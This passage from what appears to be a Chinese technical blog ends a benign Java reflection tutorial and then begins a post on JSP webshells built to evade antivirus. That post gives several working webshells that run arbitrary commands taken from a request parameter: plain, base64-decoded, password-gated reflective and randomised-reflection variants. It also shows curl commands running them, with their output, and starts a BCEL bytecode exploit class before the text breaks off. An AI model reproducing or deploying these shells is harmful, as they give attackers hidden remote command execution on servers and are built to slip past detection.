<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取实例后需要强制类型转换</span></span><br><span class="line">Date d = (Date)<span class="module-access"><span class="module"><span class="identifier">Crazyit</span>.</span></span>get<span class="constructor">Instance(<span class="string">&quot;java.util.Date&quot;</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>甚至出现如下代码：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">JFrame f = (JFrame)<span class="module-access"><span class="module"><span class="identifier">Crazyit</span>.</span></span>get<span class="constructor">Instance(<span class="string">&quot;java.util.Date&quot;</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码在编译时不会有任何问题，但运行时将抛出ClassCastException异常，因为程序试图将一个Date对象转换成JFrame对象。</p>
<p>如果将上面的CrazyitObjectFactory工厂类改写成使用泛型后的Class，就可以避免这种情况。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrazyitObjectFactory2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">getInstance</span><span class="params">(Class&lt;T&gt; cls)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  cls.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取实例后无须类型转换</span></span><br><span class="line">        Date d = CrazyitObjectFactory2.getInstance(Date.class);</span><br><span class="line">        JFrame f = CrazyitObjectFactory2.getInstance(JFrame.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面程序的<code>getInstance()</code>方法中传入一个<code>Class&lt;T&gt;</code>参数，这是一个泛型化的Class对象，调用该Class对象的<code>newInstance()</code>方法将会返回一个T对象，如程序中粗体子代码所示。接下来当使用CrazyitObjectFactory2工厂类的<code>getInstance()</code>方法来产生对象时，无须使用强制类型转换，系统会执行更严格的检测，不会出现ClassCastException运行时异常。</p>
<p>前面介绍Array类来创建数组时，曾经看到如下代码：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用Array的newInstance方法来创建一个数组</span></span><br><span class="line">Object arr = <span class="module-access"><span class="module"><span class="identifier">Array</span>.</span></span><span class="keyword">new</span><span class="constructor">Instance(String.<span class="params">class</span>, 10)</span>;</span><br></pre></td></tr></table></figure>

<p>对于上面的代码其实使用并不是非常方便，因为<code>newInstance()</code>方法返回的确实是一个String[]数组，而不是简单的Object对象。如果需要将arr对象当成String[]数组使用，则必须使用强制类型转换——这是不安全的操作。</p>
<p>为了示范泛型的优势，可以对Array的<code>newInstance()</code>方法进行包装</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CrazyitArray</span> </span>&#123;</span><br><span class="line">    <span class="comment">//对Array的newInstance方法进行包装</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T[] newInstance(Class&lt;T&gt; componentType, <span class="keyword">int</span> length) &#123;</span><br><span class="line">        <span class="keyword">return</span> (T[]) Array.newInstance(componentType, length); <span class="comment">//(1)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用CrazyitArray的newInstance()创建一维数组</span></span><br><span class="line">        String[] arr = CrazyitArray.newInstance(String.class, <span class="number">10</span>);</span><br><span class="line">        <span class="comment">//使用CrazyitArray的newInstance()创建二维数组</span></span><br><span class="line">        <span class="comment">//在这种情况下，只要设置数组元素的类型时int[]即可</span></span><br><span class="line">        <span class="keyword">int</span>[][] intArr = CrazyitArray.newInstance(<span class="keyword">int</span>[].class, <span class="number">5</span>);</span><br><span class="line">        arr[<span class="number">5</span>] = <span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        <span class="comment">//intArray是二维数组，初始化该数组的第二个数组元素</span></span><br><span class="line">        <span class="comment">//二维数组的元素必须是一维数组</span></span><br><span class="line">        intArr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">23</span>, <span class="number">12</span>&#125;;</span><br><span class="line">        System.out.println(arr[<span class="number">5</span>]);</span><br><span class="line">        System.out.println(intArr[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面程序<code>newInstance()</code>方法对Array类提供的<code>newInstance()</code>方法进行了包装，将方法签名改成了<code>public static &lt;T&gt; T[] newInstance(Class&lt;T&gt; componentType, int length)</code>，这就保证程序通过该<code>newInstance()</code>方法创建数组时返回值就是数组对象，而不是Object对象，从而避免强制类型转换。</p>
<blockquote>
<p>程序中会有一个unchecked编译告警，使用@SuppressWarnings(“unchecked”)来抑制这个告警信息</p>
</blockquote>
<h3 id="6-2-使用反射来获取泛型信息"><a href="#6-2-使用反射来获取泛型信息" class="headerlink" title="6.2 使用反射来获取泛型信息"></a>6.2 使用反射来获取泛型信息</h3><p>通过指定类对应的Class对象，可以获得该类里包含的所有成员变量，不管该成员变量是使用private修饰，还是使用public修饰。获得了成员变量对应的Field对象后，就可以很容易地获得该成员变量的数据类型，即使用如下代码即可获得指定成员变量的类型。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>获取成员变量f的类型</span><br><span class="line">Class&lt;?&gt; a = f.getType();</span><br></pre></td></tr></table></figure>

<p>但这种方式只对普通类型的成员变量有效。如果该成员变量的类型是有泛型类型的类型，如<code>Map&lt;String, Integer&gt;</code>类型，则不能准确地得到该成员变量的泛型参数。</p>
<p>为了获得指定成员变量的泛型类型，应先使用如下方法来获取该成员变量的泛型类型。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">//获得成员变量f的泛型类型</span><br><span class="line"><span class="keyword">Type</span> <span class="type">gType </span>= f.getGenericType();</span><br></pre></td></tr></table></figure>

<p>然后将Type对象强制类型转换为ParameterizedType类提供了如下两个方法。</p>
<ul>
<li><code>getRawType():</code>返回没有泛型信息的原始类型</li>
<li><code>getActualTypeArguments():</code>返回泛型参数的类型</li>
</ul>
<p>下面是一个获取泛型类型的完整程序。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Parameter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.ParameterizedType;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Type;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String ,Integer&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException </span>&#123;</span><br><span class="line">        Class&lt;GenericTest&gt; clazz = GenericTest.class;</span><br><span class="line">        Field f = clazz.getDeclaredField(<span class="string">&quot;score&quot;</span>);</span><br><span class="line">        <span class="comment">//直接使用getType()取出类型只对普通类型的成员变量有效</span></span><br><span class="line">        Class&lt;?&gt; a = f.getType();</span><br><span class="line">        <span class="comment">//下面将看到仅输出java.util.Map</span></span><br><span class="line">        System.out.println(<span class="string">&quot;score的类型是：&quot;</span> +a);</span><br><span class="line">        <span class="comment">//获得成员变量f的泛型</span></span><br><span class="line">        Type gType = f.getGenericType();</span><br><span class="line">        <span class="comment">//如果gType类型是ParameterizedType对象</span></span><br><span class="line">        <span class="keyword">if</span>(gType <span class="keyword">instanceof</span> ParameterizedType) &#123;</span><br><span class="line">            <span class="comment">//强制类型转换</span></span><br><span class="line">            ParameterizedType pType = (ParameterizedType) gType;</span><br><span class="line">            <span class="comment">//获取原始类型</span></span><br><span class="line">            Type rType = pType.getRawType();</span><br><span class="line">            System.out.println(<span class="string">&quot;原始类型时：&quot;</span> + rType);</span><br><span class="line">            <span class="comment">//取得泛型类型的泛型参数</span></span><br><span class="line">            Type[] tArgs = pType.getActualTypeArguments();</span><br><span class="line">            System.out.println(<span class="string">&quot;泛型信息是：&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tArgs.length; i++) &#123;</span><br><span class="line">                System.out.println(tArgs[i]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;泛型获取出错&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">score的类型是：interface java<span class="selector-class">.util</span><span class="selector-class">.Map</span></span><br><span class="line">原始类型时：interface java<span class="selector-class">.util</span><span class="selector-class">.Map</span></span><br><span class="line">泛型信息是：</span><br><span class="line">class java<span class="selector-class">.lang</span><span class="selector-class">.String</span></span><br><span class="line">class java<span class="selector-class">.lang</span>.Integer</span><br></pre></td></tr></table></figure>

<p>从上面的运行结果可以知道，<code>getType()</code>只能获取普通类型的成员变量数据类型；对于增加了泛型的成员变量，应该使用<code>getGenericType()</code>方法来获得其类型。</p>
<blockquote>
<p>Type也是Java.lang.reflect包下的一个接口，该接口代表所有类型的公共高级接口，Class是Type接口的实现类。Type包括原始类型、参数化类型、数组类型、类型变量和基本类型等。</p>
</blockquote>
<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>本文介绍了Java反射的相关知识。从类的加载、初始化开始，深入介绍了Java类加载器的原理和机制。重点介绍了Class、Method、Field、Constructor、Type、ParameterizedType等类和接口的用法，包括动态代理创建Java实例和动态调用Java对象的方法。介绍的两个对象工厂示例就是Spring框架的核心。还介绍了Proxy和Invocation来创建JDK动态代理，并介绍了JDK动态代理和AOP之间的关系，这也是Java灵活性的重要方面。</p>
<h2 id="8-参考"><a href="#8-参考" class="headerlink" title="8. 参考"></a>8. 参考</h2><ul>
<li><a href="https://lanlan2017.github.io/JavaReadingNotes/712f16a6/">https://lanlan2017.github.io/JavaReadingNotes/712f16a6/</a></li>
<li>《疯狂Java讲义》</li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>jsp免杀</title>
    <url>/jsp%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<blockquote>
<p>知人者智，自知者明。</p>
</blockquote>
<p>jsp免杀学习。主要参考少许电华师傅的视频和文章，以及其他师傅的文章做参考。</p>
<span id="more"></span>



<h2 id="1-JSP浅析"><a href="#1-JSP浅析" class="headerlink" title="1. JSP浅析"></a>1. JSP浅析</h2><p>整个JSP的内容实际上是一个HTML，但是稍有不同：</p>
<ul>
<li>包含在<code>&lt;%--</code>和<code>--%&gt;</code>之间的是JSP的注释，它们会被完全忽略；</li>
<li>包含在<code>&lt;%</code>和<code>%&gt;</code>之间的是Java代码，可以编写任意Java代码；</li>
<li>如果使用<code>&lt;%= xxx %&gt;</code>则可以快捷输出一个变量的值。</li>
</ul>
<p>JSP页面内置了几个变量：</p>
<ul>
<li>out：表示HttpServletResponse的PrintWriter；</li>
<li>session：表示当前HttpSession对象；</li>
<li>request：表示HttpServletRequest对象。</li>
</ul>
<p>这几个变量可以直接使用。</p>
<h2 id="2-构建webshell测试环境"><a href="#2-构建webshell测试环境" class="headerlink" title="2. 构建webshell测试环境"></a>2. 构建webshell测试环境</h2><p>在主机上创建tomcat目录：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/usr/</span>local<span class="regexp">/tomcat/</span>webapps</span><br></pre></td></tr></table></figure>

<p>是用docker构建tomcat:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">docker run -d -p <span class="number">8081</span>:<span class="number">8080</span> -v <span class="regexp">/usr/</span>local<span class="regexp">/tomcat/</span>webapps:<span class="regexp">/usr/</span>local<span class="regexp">/tomcat/</span>webapps --name mytomcat tomcat</span><br></pre></td></tr></table></figure>

<p>创建一个tomcat app</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/usr/</span>local<span class="regexp">/tomcat/</span>webapps/webshell</span><br></pre></td></tr></table></figure>

<p>编写一个最简单的jsp webshell:</p>
<p>jspshell0.jsp:</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Process process = runtime.exec(cmd);</span><br><span class="line">    java.io.InputStream in = process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将这个webshell放到docker映射的tomcat web主机目录上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS /tmp]% scp jspshell0.jsp debian:/usr/<span class="built_in">local</span>/tomcat/webapps/webshell/</span><br><span class="line">jspshell0.jsp                                           100%  626     1.1MB/s   00:00</span><br></pre></td></tr></table></figure>

<p>然后访问访问。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS /tmp]% curl http://172.16.42.150:8081/webshell/jspshell0.jsp?cmd=whoami</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;root</span><br><span class="line">&lt;/pre&gt;%</span><br></pre></td></tr></table></figure>



<h2 id="3-最简单的马测试"><a href="#3-最简单的马测试" class="headerlink" title="3. 最简单的马测试"></a>3. 最简单的马测试</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Runtime runtime = <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>;</span><br><span class="line">    String cmd = request.get<span class="constructor">Parameter(<span class="string">&quot;cmd&quot;</span>)</span>;</span><br><span class="line">    Process process = runtime.exec(cmd);</span><br><span class="line">    java.io.InputStream <span class="keyword">in</span> = process.get<span class="constructor">InputStream()</span>;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.<span class="constructor">InputStreamReader(<span class="params">in</span>)</span>;</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.<span class="constructor">BufferedReader(<span class="params">resultReader</span>)</span>;</span><br><span class="line">    String s = null;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.read<span class="constructor">Line()</span>) != null) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如上jsp代码，<code>&lt;%@ page ... %&gt;</code> 定义网页依赖属性，比如脚本语言、error页面、缓存需求等等，body标签里面先获取Runtime对象。request是JSP内置变量，表示HttpServletRequest对象，通过request拿到url请求中的cmd变量，然后通过Runtime对象调用exec方法执行cmd参数传递的指令。然后将执行的结果传入InputStream，然后打印出结果。</p>
<h2 id="4-base64马"><a href="#4-base64马" class="headerlink" title="4. base64马"></a>4. base64马</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Runtime runtime = Runtime.getRuntime();</span><br><span class="line">    String cmdx = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] decodedBytes = Base64.getDecoder().decode(cmdx);</span><br><span class="line">    String cmd = <span class="keyword">new</span> String(decodedBytes);</span><br><span class="line">    Process process = runtime.exec(cmd);</span><br><span class="line">    java.io.InputStream in = process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><code>http://172.16.42.151:8081/aa.jsp?cmd=aWQ=</code></p>
<p>注意参数必须是base64格式，不然会报错</p>
<h2 id="5-反射方式"><a href="#5-反射方式" class="headerlink" title="5. 反射方式"></a>5. 反射方式</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 加入一个密码</span></span><br><span class="line">    String PASSWORD = <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    String passwd = request.getParameter(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!passwd.equals(PASSWORD)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 反射调用</span></span><br><span class="line">    Class rt = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    java.lang.reflect.Method gr = rt.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">    java.lang.reflect.Method ex = rt.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    Process process = (Process) ex.invoke(gr.invoke(<span class="keyword">null</span>), cmd);</span><br><span class="line">    java.io.InputStream in = process.getInputStream();</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    java.io.InputStreamReader resultReader = <span class="keyword">new</span> java.io.InputStreamReader(in);</span><br><span class="line">    java.io.BufferedReader stdInput = <span class="keyword">new</span> java.io.BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl http://localhost:8080/jspshell/jsp1.jsp?cmd=id&amp;<span class="built_in">pwd</span>=password</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;uid=501(shadowflow) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)</span><br><span class="line">&lt;/pre&gt;%</span><br></pre></td></tr></table></figure>



<h2 id="6-利用随机数运行时可知字符串绕过"><a href="#6-利用随机数运行时可知字符串绕过" class="headerlink" title="6. 利用随机数运行时可知字符串绕过"></a>6. 利用随机数运行时可知字符串绕过</h2><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Random&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String s2 = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Class rt;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            rt = Class.forName(<span class="string">&quot;java.lang.&quot;</span> + (<span class="keyword">new</span> String(Character.toChars(<span class="keyword">new</span> Random().nextInt(<span class="number">3</span>) + <span class="number">80</span>))) + <span class="string">&quot;untime&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Field currentRuntime = rt.getDeclaredFields()[<span class="number">0</span>];</span><br><span class="line">    currentRuntime.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Object o = currentRuntime.get(<span class="keyword">null</span>);</span><br><span class="line">    Process process;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Method method = rt.getDeclaredMethods()[<span class="keyword">new</span> Random().nextInt(<span class="number">20</span>)];</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            process = (Process) MethodUtil.invoke(method, o, <span class="keyword">new</span> Object[]&#123;s2.split(<span class="string">&quot; &quot;</span>)&#125;);</span><br><span class="line">            <span class="keyword">if</span> (process ==  <span class="keyword">null</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    InputStream inputStream = process.getInputStream();</span><br><span class="line">    StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(inputStream));</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">[shadowflow<span class="meta">@ShadowOS</span> ~]% curl http:<span class="comment">//localhost:8080/jspshell/jsp2.jsp?cmd=whoami</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>shadowflow</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span>%</span><br></pre></td></tr></table></figure>



<h2 id="7-BCEL字节码的JSP"><a href="#7-BCEL字节码的JSP" class="headerlink" title="7. BCEL字节码的JSP"></a>7. BCEL字节码的JSP</h2><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于<code>com.sun.org.apache.bcel</code>。</p>
<p>==在Java 8u251以后,BCEL不再适用。==我们在构建环境的时候tomcat运行环境的java必须要低于此版本才能成功。</p>
<p>先编写一个exp</p>
<p>exp.java:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    String res;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line=reader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            stringBuilder.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">this</span>.res = stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>再在同一个目录下编写一个程序将exp.java转为字节码</p>
<p>Util.java:</p>
